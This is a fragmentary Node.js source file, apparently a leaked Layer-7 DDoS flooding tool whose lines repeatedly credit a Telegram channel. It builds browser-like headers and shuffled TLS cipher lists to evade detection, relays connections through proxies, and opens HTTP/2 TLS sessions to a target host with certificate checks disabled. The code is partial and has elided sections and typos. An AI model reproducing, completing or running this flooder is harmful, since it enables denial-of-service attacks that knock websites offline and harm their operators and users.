...
const net = require("net");
 ...
 const lang_header = ["en-US,en;q=0.9"];// Method DDoS Layer7 Leaked By  t.me/LekaingCode
 
 const encoding_header = ["gzip, deflate, br"];
 
 const control_header = ["no-cache", "max-age=0"];
 
 const refers = [// Method DDoS Layer7 Leaked By  t.me/LekaingCode
     "https://www.google.com/",// Method DDoS Layer7 Leaked By  t.me/LekaingCode
 ...
 const ciphers1 = "GREASE:" + [// Method DDoS Layer7 Leaked By  t.me/LekaingCode
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
 ...
 // Method DDoS Layer7 Leaked By  t.me/LekaingCode
     ...
     connection.setKeepAlive(true, 100000);// Method DDoS Layer7 Leaked By  t.me/LekaingCode
 // Method DDoS Layer7 Leaked By  t.me/LekaingCode
     connection.on("connect", () => {// Method DDoS Layer7 Leaked By  t.me/LekaingCode
         connection.write(buffer);// Method DDoS Layer7 Leaked By  t.me/LekaingCode
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");// Method DDoS Layer7 Leaked By  t.me/LekaingCode
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {// Method DDoS Layer7 Leaked By  t.me/LekaingCode
             connection.destroy();// Method DDoS Layer7 Leaked By  t.me/LekaingCode
...
// Method DDoS Layer7 Leaked By  t.me/LekaingCode
 ...
 function runFlooder() {
	 ...
	 //headers[":authority"] = parsedTarget.host;
         ...
         headers["origin"] = "https://" + parsedTarget.host;
// Method DDoS Layer7 Leaked By  t.me/LekaingCode
     const proxyOptions = {// Method DDoS Layer7 Leaked By  t.me/LekaingCode
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
...
// Method DDoS Layer7 Leaked By  t.me/LekaingCode
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         connection.setKeepAlive(true, 600000);// Method DDoS Layer7 Leaked By  t.me/LekaingCode

         const tlsOptions = {
            host: parsedTarget.host,// Method DDoS Layer7 Leaked By  t.me/LekaingCode
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,// Method DDoS Layer7 Leaked By  t.me/LekaingCode
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,// Method DDoS Layer7 Leaked By  t.me/LekaingCode
